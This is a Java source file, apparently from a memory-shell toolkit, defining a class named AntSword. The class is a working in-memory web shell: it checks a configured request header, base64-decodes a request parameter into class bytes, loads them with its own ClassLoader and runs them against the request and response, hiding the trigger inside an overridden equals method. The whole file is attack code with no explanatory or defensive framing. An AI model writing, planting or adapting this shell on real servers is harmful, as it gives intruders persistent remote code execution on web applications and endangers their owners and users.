package com.reajason.javaweb.memshell.shelltool.antsword;

import java.lang.reflect.Field;

/**
 * @author ReaJason
 */
public class AntSword extends ClassLoader {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSword() {
    }

    public AntSword(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrap(args[0], "request");
        Object response = unwrap(args[1], "response");
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] bytes = base64Decode(parameter);
                Object instance = (new AntSword(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(new Object[]{request, response});
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        try {
            Object decoder = Class.forName("java.util.Base64", false, loader).getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder", false, loader).newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj, String fieldName) {
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException();
    }
}